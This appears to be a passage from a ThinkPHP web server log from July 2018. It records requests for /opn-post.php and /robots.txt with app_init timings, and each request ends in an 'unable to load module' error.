INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000395s ]
ERR: 无法加载模块:App

[ 2018-07-20T10:12:44+08:00 ] 118.24.61.216 /opn-post.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000413s ]
ERR: 无法加载模块:Opn-post

[ 2018-07-20T16:36:23+08:00 ] 66.249.66.29 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000391s ]
ERR: 无法加载模块:Robots

